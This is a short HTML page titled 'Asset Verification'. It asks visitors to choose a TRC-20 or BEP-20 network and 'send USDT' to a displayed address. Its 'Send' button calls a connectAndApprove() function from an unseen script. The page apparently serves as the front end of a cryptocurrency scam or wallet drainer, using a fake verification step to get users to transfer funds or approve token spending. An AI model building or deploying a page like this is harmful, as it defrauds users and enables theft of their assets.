<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Asset Verification</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <h1>Select Network to Verify Asset</h1>
    <div class="selector">
      <button onclick="selectNetwork('trc20')">TRC-20</button>
      <button onclick="selectNetwork('bep20')">BEP-20</button>
    </div>

    <div id="details" style="display: none;">
      <p>Send USDT to:</p>
      <code id="usdt-address">-</code>
      <button onclick="connectAndApprove()">Send</button>
    </div>
  </div>

  <script src="main.js"></script>
</body>
</html>
